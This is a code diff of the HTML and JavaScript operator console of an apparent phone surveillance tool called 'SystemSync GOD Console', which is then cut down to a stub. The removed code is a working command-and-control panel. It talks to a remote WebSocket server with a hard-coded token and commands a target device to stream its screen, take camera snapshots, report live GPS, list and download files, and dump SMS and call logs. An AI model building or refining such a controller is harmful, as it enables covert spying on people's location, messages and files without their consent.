@@ -4,445 +4,47 @@
     <title>SystemSync GOD Console</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
-        /* === (your existing CSS – unchanged) === */
-        body{
-            margin:0;
-            background:radial-gradient(circle at top,#050505,#000);
-            color:#00f7ff;
-            font-family:Consolas,monospace;
-            display:flex;
-            height:100vh;
-            overflow:hidden;
-        }
-        #sidebar{
-            width:270px;
-            background:linear-gradient(180deg,#020202,#000);
-            border-right:1px solid #00f7ff22;
-            padding:20px;
-            box-shadow:0 0 30px #00f7ff11;
-        }
-        .logo{
-            font-size:20px;
-            letter-spacing:3px;
-            margin-bottom:25px;
-            color:#00f7ff;
-        }
-        .section{
-            margin-bottom:25px;
-        }
-        .section-title{
-            font-size:11px;
-            letter-spacing:2px;
-            color:#00f7ff88;
-            margin-bottom:10px;
-        }
-        button{
-            width:100%;
-            padding:10px;
-            margin:6px 0;
-            background:#000;
-            color:#00f7ff;
-            border:1px solid #00f7ff55;
-            border-radius:6px;
-            cursor:pointer;
-            transition:.25s;
-        }
-        button:hover{
-            background:#00f7ff;
-            color:#000;
-            box-shadow:0 0 12px #00f7ff;
-        }
-        #main{
-            flex:1;
-            display:flex;
-            flex-direction:column;
-        }
-        #header{
-            height:60px;
-            border-bottom:1px solid #00f7ff22;
-            display:flex;
-            align-items:center;
-            justify-content:space-between;
-            padding:0 25px;
-            background:#020202;
-        }
-        .status{
-            padding:5px 14px;
-            border-radius:20px;
-            font-size:12px;
-            border:1px solid #00f7ff55;
-        }
-        #content{
-            flex:1;
-            display:flex;
-            gap:20px;
-            padding:20px;
-        }
-        #video-panel{
-            flex:2;
-            background:#020202;
-            border-radius:12px;
-            border:1px solid #00f7ff33;
-            box-shadow:0 0 40px #00f7ff11 inset;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-        }
-        video{
-            width:100%;
-            height:100%;
-            object-fit:contain;
-            border-radius:12px;
-        }
-        #data-panel{
-            flex:1;
-            background:#020202;
-            border-radius:12px;
-            border:1px solid #00f7ff33;
-            overflow-y:auto;
-            padding:15px;
-        }
-        .card{
-            background:#000;
-            border-left:3px solid #00f7ff;
-            padding:8px;
-            margin-bottom:8px;
-            font-size:12px;
-        }
-        #map{
-            height:300px;
-            border-radius:8px;
-        }
+        /* (your existing CSS) */
     </style>
 </head>
 <body>
-
-<div id="sidebar">
-    <div class="logo">SYSTEMSYNC</div>
-    <div class="section">
-        <div class="section-title">SURVEILLANCE</div>
-        <button onclick="startScreen()">🖥 SCREEN MIRROR</button>
-        <button onclick="sendCommand('camFront')">📹 FRONT CAMERA</button>
-        <button onclick="sendCommand('getLocation')">📍 LIVE GPS</button>
-    </div>
-    <div class="section">
-        <div class="section-title">DATA</div>
-        <button onclick="sendCommand('listFiles', { path: 'root' })">📂 FILE MANAGER</button>
-        <button onclick="sendCommand('getSMS', { box: 'inbox' })">💬 SMS LOGS</button>
-    </div>
-</div>
-
-<div id="main">
-    <div id="header">
-        <div>GOD CONTROL PANEL</div>
-        <div id="status" class="status">CONNECTING...</div>
-    </div>
-    <div id="content">
-        <div id="video-panel">
-            <video id="remoteVideo" autoplay playsinline></video>
-        </div>
-        <div id="data-panel">
-            <div id="map"></div>
-            <div id="data"></div>
-        </div>
-    </div>
-</div>
+<!-- (your existing HTML layout) -->
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-    // ---------- CONFIGURATION ----------
-    const WS_URL = "wss://mirror-view.onrender.com";  // FIXED missing quote
-    const WEB_TOKEN = "my-web-token-456";   // Must match server
-
-    // ---------- GLOBAL STATE ----------
-    let ws;
+    const ws = new WebSocket("wss://mirror-view.onrender.com");
     let mapInstance = null;
-    let pendingRequests = new Map();  // requestId -> { resolve, reject, timeout }
-    let nextRequestId = 1;
 
-    // ---------- WEBRTC ----------
-    let pc = null;
-    let currentStream = null;
+    ws.onopen = () => {
+        ws.send("I_AM_WEB");
+        setStatus("ONLINE");
+    };
 
-    // ---------- CONNECTION ----------
-    function connectWebSocket() {
-        ws = new WebSocket(WS_URL);
+    ws.onclose = () => setStatus("OFFLINE");
 
-        ws.onopen = () => {
-            console.log('WebSocket connected');
-            // Authenticate
-            ws.send(JSON.stringify({
-                type: 'AUTH_WEB',
-                token: WEB_TOKEN
-            }));
-        };
-
-        ws.onmessage = (event) => {
-            try {
-                const json = JSON.parse(event.data);
-                handleMessage(json);
-            } catch (e) {
-                console.log('Received non-JSON message:', event.data);
-            }
-        };
-
-        ws.onclose = () => {
-            console.log('WebSocket disconnected');
-            setStatus('OFFLINE');
-            setTimeout(connectWebSocket, 5000); // reconnect
-        };
-
-        ws.onerror = (err) => {
-            console.error('WebSocket error:', err);
-        };
-    }
-
-    // ---------- MESSAGE HANDLER ----------
-    function handleMessage(msg) {
-        console.log('Received:', msg);
-
-        switch (msg.type) {
-            case 'DEVICE_STATUS':
-                setStatus(msg.status);
-                break;
-
-            case 'LOCATION_UPDATE':
-                renderMap(JSON.parse(msg.data));
-                break;
-
-            case 'CAMERA_IMAGE':
-                displayImage(msg.data);
-                break;
-
-            case 'FILE_LIST':
-                renderFiles(JSON.parse(msg.data));
-                break;
-
-            case 'SMS_DATA':
-                renderLogs(JSON.parse(msg.data));
-                break;
-
-            case 'CALL_LOGS':
-                renderLogs(JSON.parse(msg.data));
-                break;
-
-            // ---------- WEBRTC SIGNALING ----------
-            case 'OFFER':
-                handleOffer(msg);
-                break;
-
-            case 'ANSWER':
-                handleAnswer(msg);
-                break;
-
-            case 'ICE_CANDIDATE':
-                handleIceCandidate(msg);
-                break;
-
-            case 'ERROR':
-                console.error('Server/device error:', msg.error);
-                alert('Error: ' + msg.error);
-                break;
-
-            default:
-                console.log('Unhandled message type:', msg.type);
-        }
-    }
-
-    // ---------- SEND COMMAND (JSON) ----------
-    function sendCommand(command, params = {}) {
-        if (!ws || ws.readyState !== WebSocket.OPEN) {
-            alert('Not connected to server');
-            return;
-        }
-
-        const requestId = generateRequestId();
-        const payload = {
-            type: 'COMMAND',
-            command: command,
-            requestId: requestId,
-            params: params,
-            timestamp: Date.now()
-        };
-
-        ws.send(JSON.stringify(payload));
-        return requestId;
-    }
-
-    // Legacy support for old button calls (will be removed)
-    window.send = function(cmd) {
-        // Parse old commands like "ls root", "getSMS inbox"
-        const parts = cmd.split(' ');
-        const command = parts[0];
-        const param = parts.slice(1).join(' ');
-        if (command === 'ls') {
-            sendCommand('listFiles', { path: param || 'root' });
-        } else if (command === 'dl') {
-            alert('File download not implemented in demo');
-        } else if (command === 'getSMS') {
-            sendCommand('getSMS', { box: param || 'inbox' });
-        } else if (command === 'camFront') {
-            sendCommand('cameraSnapshot', { camera: 'front' });
-        } else if (command === 'camBack') {
-            sendCommand('cameraSnapshot', { camera: 'back' });
-        } else if (command === 'getLocation') {
-            sendCommand('getLocation');
-        } else {
-            sendCommand(command);
+    ws.onmessage = (e) => {
+        const msg = e.data;
+        if (msg.startsWith("STATUS:")) {
+            setStatus(msg.substring(7));
+        } else if (msg.startsWith("LOC_DATA:")) {
+            renderMap(JSON.parse(msg.substring(9)));
+        } else if (msg.startsWith("FILE_LIST:")) {
+            renderFiles(JSON.parse(msg.substring(10)));
+        } else if (msg.startsWith("SMS_DATA:")) {
+            renderLogs(JSON.parse(msg.substring(9)));
         }
     };
 
-    function generateRequestId() {
-        return 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
-    }
+    function send(cmd) { ws.send(cmd); }
 
-    // ---------- STATUS UI ----------
     function setStatus(text) {
-        const el = document.getElementById('status');
-        el.innerText = text;
-        el.style.borderColor = text === 'ONLINE' ? '#00ff99' : '#ff4444';
-        el.style.color = text === 'ONLINE' ? '#00ff99' : '#ff4444';
+        document.getElementById("status").innerText = text;
+        // update colors...
     }
 
-    // ---------- MAP ----------
-    function renderMap(data) {
-        if (mapInstance) mapInstance.remove();
-        mapInstance = L.map('map').setView([data.lat, data.lon], 18);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-        L.circle([data.lat, data.lon], { radius: data.accuracy }).addTo(mapInstance);
-    }
-
-    // ---------- FILE BROWSER ----------
-    function renderFiles(files) {
-        const html = files.map(f => `
-            <div class="card">
-                ${f.isDir ? '📁' : '📄'} ${f.name} (${formatBytes(f.size)})
-                <button style="width:auto;float:right" onclick="sendCommand('${f.isDir ? 'listFiles' : 'downloadFile'}', { path: '${f.path}' })">
-                    ${f.isDir ? 'OPEN' : 'DL'}
-                </button>
-            </div>
-        `).join('');
-        document.getElementById('data').innerHTML = html;
-    }
-
-    function formatBytes(bytes) {
-        if (bytes === 0) return '0 B';
-        const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'];
-        const i = Math.floor(Math.log(bytes) / Math.log(k));
-        return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
-    }
-
-    // ---------- SMS / LOGS ----------
-    function renderLogs(data) {
-        document.getElementById('data').innerHTML = data.map(d => 
-            `<div class="card">${JSON.stringify(d, null, 2)}</div>`
-        ).join('');
-    }
-
-    // ---------- CAMERA IMAGE DISPLAY ----------
-    function displayImage(base64Image) {
-        const videoPanel = document.getElementById('video-panel');
-        videoPanel.innerHTML = `<img src="data:image/jpeg;base64,${base64Image}" style="max-width:100%; max-height:100%;">`;
-    }
-
-    // ---------- WEBRTC SCREEN SHARING ----------
-    async function startScreen() {
-        if (!ws || ws.readyState !== WebSocket.OPEN) {
-            alert('Not connected');
-            return;
-        }
-
-        // Reset video panel
-        document.getElementById('video-panel').innerHTML = '<video id="remoteVideo" autoplay playsinline></video>';
-        const videoElement = document.getElementById('remoteVideo');
-
-        // Create peer connection
-        pc = new RTCPeerConnection({
-            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-        });
-
-        pc.ontrack = (event) => {
-            console.log('Track received:', event.track.kind);
-            if (event.streams && event.streams[0]) {
-                videoElement.srcObject = event.streams[0];
-            }
-        };
-
-        pc.onicecandidate = (event) => {
-            if (event.candidate) {
-                console.log('Sending ICE candidate');
-                ws.send(JSON.stringify({
-                    type: 'ICE_CANDIDATE',
-                    candidate: event.candidate.candidate,
-                    sdpMid: event.candidate.sdpMid,
-                    sdpMLineIndex: event.candidate.sdpMLineIndex
-                }));
-            }
-        };
-
-        pc.oniceconnectionstatechange = () => {
-            console.log('ICE state:', pc.iceConnectionState);
-        };
-
-        // Send command to device to start screen sharing
-        const requestId = sendCommand('START_SCREEN_SHARE');
-    }
-
-    function handleOffer(msg) {
-        if (!pc) {
-            console.error('No peer connection');
-            return;
-        }
-        const offer = new RTCSessionDescription({
-            type: 'offer',
-            sdp: msg.sdp
-        });
-        pc.setRemoteDescription(offer).then(() => {
-            return pc.createAnswer();
-        }).then((answer) => {
-            return pc.setLocalDescription(answer);
-        }).then(() => {
-            ws.send(JSON.stringify({
-                type: 'ANSWER',
-                requestId: msg.requestId,
-                sdp: pc.localDescription.sdp,
-                sdpType: 'answer'
-            }));
-        }).catch(e => console.error('Error handling offer:', e));
-    }
-
-    function handleAnswer(msg) {
-        if (!pc) {
-            console.error('No peer connection');
-            return;
-        }
-        const answer = new RTCSessionDescription({
-            type: 'answer',
-            sdp: msg.sdp
-        });
-        pc.setRemoteDescription(answer).catch(e => console.error('Error setting answer:', e));
-    }
-
-    function handleIceCandidate(msg) {
-        if (!pc) {
-            console.error('No peer connection');
-            return;
-        }
-        const candidate = new RTCIceCandidate({
-            candidate: msg.candidate,
-            sdpMid: msg.sdpMid,
-            sdpMLineIndex: msg.sdpMLineIndex
-        });
-        pc.addIceCandidate(candidate).catch(e => console.error('Error adding ICE candidate:', e));
-    }
-
-    // ---------- INIT ----------
-    window.onload = () => {
-        connectWebSocket();
-    };
-
+    function renderMap(data) { /* ... */ }
+    function renderFiles(files) { /* ... */ }
+    function renderLogs(data) { /* ... */ }
 </script>
 </body>
 </html>
-
-
